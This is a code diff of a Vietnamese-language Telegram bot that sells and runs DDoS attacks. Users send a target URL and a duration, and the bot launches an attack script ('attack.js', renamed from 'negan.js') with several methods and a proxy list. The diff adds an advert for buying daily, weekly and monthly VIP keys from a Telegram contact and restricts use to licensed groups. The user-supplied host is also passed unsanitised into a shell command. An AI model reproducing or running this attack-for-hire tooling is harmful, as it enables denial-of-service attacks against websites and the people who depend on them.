@@ -36,24 +36,20 @@ const helpMessage = `📜 Hướng dẫn sử dụng:
 
 🔐 Quyền hạn:
 - Admin: Có thể chỉ định thời gian tùy ý (tối đa ${maxTimeAttacks} giây), sử dụng lệnh <code>/pkill</code>, <code>/on</code>, <code>/off</code>.
-- Người dùng thường: Thời gian tối đa 120 giây, không thể sử dụng lệnh admin.`;
+- Người dùng thường: Thời gian tối đa 120 giây, không thể sử dụng lệnh admin.
+
+💳 Mua Key VIP Ngày/Tuần/Tháng liên hệ @adam022022.`;
 
 const sendHelp = (chatId, caller) => bot.sendMessage(chatId, `${caller ? `@${caller} ` : ''}${helpMessage}`, { parse_mode: 'HTML' });
 
 const initBot = () => {
-    // Gửi thông báo khởi động đến tất cả admin
-    adminIds.forEach(adminId => {
-        bot.sendMessage(adminId, '[🤖Version PRO🤖] BOT Đang Chờ Lệnh.')
-            .catch(err => console.error(`❌ Không thể gửi thông báo đến admin ${adminId}:`, err.message));
-    });
-
     bot.on('message', async msg => {
         const { chat: { id: chatId }, text, from: { id: userId, username, first_name }, date } = msg;
         const isAdmin = adminIds.has(userId.toString()), isGroup = allowedGroupIds.has(chatId.toString()), caller = username || first_name;
 
         if (date * 1000 < botStartTime) return;
-        if (!isAdmin && !isGroup) return bot.sendMessage(chatId, '❌ Bạn không có quyền sử dụng liên hệ: @revenvenger.', { parse_mode: 'HTML' });
-        if (!text) return sendHelp(chatId, caller);
+        if (!isGroup) return bot.sendMessage(chatId, '❌ Bot chỉ hoạt động trong nhóm được cấp phép. Contact: @adam022022.', { parse_mode: 'HTML' });
+        if (!text) return;
 
         if (text === '/help') return sendHelp(chatId, caller);
 
@@ -61,7 +57,7 @@ const initBot = () => {
             if (!botActive) return bot.sendMessage(chatId, '❌ Bot hiện đang tắt. Chỉ admin có thể bật lại.', { parse_mode: 'HTML' });
 
             const [host, time, full] = text.split(' ');
-            if (!host || isNaN(time)) return sendHelp(chatId, caller);
+            if (!host || isNaN(time)) return bot.sendMessage(chatId, '🚫 Sai định dạng! Nhập theo: <code>https://example.com 120</code>.', { parse_mode: 'HTML' });
 
             // Kiểm tra blacklist
             const isBlacklisted = blacklist.some(blackUrl => host.includes(blackUrl));
@@ -100,7 +96,7 @@ const initBot = () => {
 
             let completedMethods = 0;
             methods.forEach(method => {
-                exec(`node --max-old-space-size=8192 ./negan.js -m ${method} -u ${host} -p live.txt --full true -s ${attackTime}`, { shell: '/bin/bash' }, (e, stdout, stderr) => {
+                exec(`node --max-old-space-size=8192 ./attack.js -m ${method} -u ${host} -p live.txt --full true -s ${attackTime}`, { shell: '/bin/bash' }, (e, stdout, stderr) => {
                     completedMethods++;
                     if (completedMethods === methods.length) {
                         const completeMessage = JSON.stringify({ Status: "👽 END ATTACK 👽", Caller: caller, "PID Attack": pid, Website: host, Methods: methods.join(' '), Time: `${attackTime} Giây`, EndTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) }, null, 2);
@@ -121,14 +117,14 @@ const initBot = () => {
         }
 
         if (text.startsWith('/pkill') || text.startsWith('/on') || text.startsWith('/off')) {
-            if (!isAdmin) return bot.sendMessage(chatId, '❌ Bạn không có quyền thực thi lệnh admin.', { parse_mode: 'HTML' });
+            if (!isAdmin) return bot.sendMessage(chatId, '❌ Bạn không có quyền thực thi lệnh admin. Contact: @adam022022', { parse_mode: 'HTML' });
 
             if (text.startsWith('/pkill')) {
-                exec('pgrep -f negan.js', (e, stdout, stderr) => {
+                exec('pgrep -f attack.js', (e, stdout, stderr) => {
                     if (e || !stdout.trim()) return bot.sendMessage(chatId, '❌ Không tìm thấy tiến trình đang chạy.', { parse_mode: 'HTML' });
 
                     const pids = stdout.trim().split('\n').join(', ');
-                    exec(`pkill -f -9 negan.js`, (e, stdout, stderr) => {
+                    exec(`pkill -f -9 attack.js`, (e, stdout, stderr) => {
                         if (e) return bot.sendMessage(chatId, '❌ Lỗi khi thực hiện pkill.', { parse_mode: 'HTML' });
                         bot.sendMessage(chatId, `✅ Đã kill hoàn toàn tiến trình. PID: ${pids}`, { parse_mode: 'HTML' });
                     });
@@ -148,8 +144,6 @@ const initBot = () => {
                 return;
             }
         }
-
-        sendHelp(chatId, caller);
     });
 };
 
